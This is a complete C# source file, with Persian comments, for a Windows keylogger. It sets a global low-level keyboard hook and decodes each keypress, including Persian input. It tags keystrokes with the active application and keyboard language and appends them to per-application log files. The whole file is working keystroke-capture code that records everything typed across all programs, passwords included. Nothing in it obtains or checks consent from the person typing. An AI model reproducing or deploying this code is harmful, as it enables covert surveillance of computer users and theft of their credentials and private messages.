using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

class Program
{
    // ==============================
    // ثابت‌های Hook
    // ==============================
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;

    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;

    // ==============================
    // WinAPI
    // ==============================

    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(
        int idHook,
        LowLevelKeyboardProc lpfn,
        IntPtr hMod,
        uint dwThreadId);

    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(
        IntPtr hhk,
        int nCode,
        IntPtr wParam,
        IntPtr lParam);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll")]
    private static extern uint GetWindowThreadProcessId(
        IntPtr hWnd,
        out uint processId);

    [DllImport("user32.dll")]
    private static extern IntPtr GetKeyboardLayout(uint idThread);

    [DllImport("user32.dll")]
    private static extern bool GetKeyboardState(byte[] lpKeyState);

    [DllImport("user32.dll")]
    private static extern uint MapVirtualKey(uint uCode, uint uMapType);

    [DllImport("user32.dll")]
    private static extern int ToUnicodeEx(
        uint wVirtKey,
        uint wScanCode,
        byte[] lpKeyState,
        [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff,
        int cchBuff,
        uint wFlags,
        IntPtr dwhkl);

    private delegate IntPtr LowLevelKeyboardProc(
        int nCode,
        IntPtr wParam,
        IntPtr lParam);

    // ==============================
    // Main
    // ==============================
    static void Main()
    {
        Console.OutputEncoding = Encoding.UTF8;
        Console.WriteLine("Keyboard Monitor Started...");

        _hookID = SetHook(_proc);
        Application.Run();
        UnhookWindowsHookEx(_hookID);
    }

    // ==============================
    // نصب Hook
    // ==============================
    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(
                WH_KEYBOARD_LL,
                proc,
                GetModuleHandle(curModule.ModuleName),
                0);
        }
    }

    // ==============================
    // Callback کیبورد
    // ==============================
    private static IntPtr HookCallback(
        int nCode,
        IntPtr wParam,
        IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);

            // کاراکتر واقعی (فارسی/انگلیسی)
            string key = GetRealCharacter(vkCode);

            // نام برنامه فعال
            string appName = GetActiveProcessName();

            // زبان واقعی کیبورد
            string language = GetCurrentKeyboardLanguage();

            if (!string.IsNullOrEmpty(key))
                LogToFile(appName, language, key);
        }

        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    // ==============================
    // دریافت نام برنامه فعال
    // ==============================
    private static string GetActiveProcessName()
    {
        IntPtr hwnd = GetForegroundWindow();
        GetWindowThreadProcessId(hwnd, out uint pid);
        return Process.GetProcessById((int)pid).ProcessName;
    }

    // ==============================
    // تشخیص زبان واقعی کیبورد
    // ==============================
    private static string GetCurrentKeyboardLanguage()
    {
        IntPtr hwnd = GetForegroundWindow();
        uint threadId = GetWindowThreadProcessId(hwnd, out _);
        IntPtr hkl = GetKeyboardLayout(threadId);
        int langId = hkl.ToInt32() & 0xFFFF;
        return new System.Globalization.CultureInfo(langId).Name;
    }

    // ==============================
    // تبدیل VK به کاراکتر واقعی
    // ==============================
    private static string GetRealCharacter(int vkCode)
    {
        byte[] keyboardState = new byte[256];
        if (!GetKeyboardState(keyboardState))
            return "";

        uint scanCode = MapVirtualKey((uint)vkCode, 0);

        IntPtr hwnd = GetForegroundWindow();
        uint threadId = GetWindowThreadProcessId(hwnd, out _);
        IntPtr hkl = GetKeyboardLayout(threadId);

        StringBuilder buffer = new StringBuilder(10);

        int result = ToUnicodeEx(
            (uint)vkCode,
            scanCode,
            keyboardState,
            buffer,
            buffer.Capacity,
            0,
            hkl);

        if (result > 0)
            return buffer.ToString();

        // کلیدهای غیرمتنی
        switch ((Keys)vkCode)
        {
            case Keys.Space: return " ";
            case Keys.Enter: return "[ENTER]\n";
            case Keys.Tab: return "[TAB]";
            case Keys.Back: return "[BACKSPACE]";
            default: return "";
        }
    }

    // ==============================
    // ذخیره در فایل
    // ==============================
    private static void LogToFile(string appName, string language, string key)
    {
        Directory.CreateDirectory("Logs");
        string path = Path.Combine("Logs", appName + ".txt");

        File.AppendAllText(
            path,
            $"{DateTime.Now:yyyy-MM-dd HH:mm:ss} [{language}] {key}",
            Encoding.UTF8);
    }
}
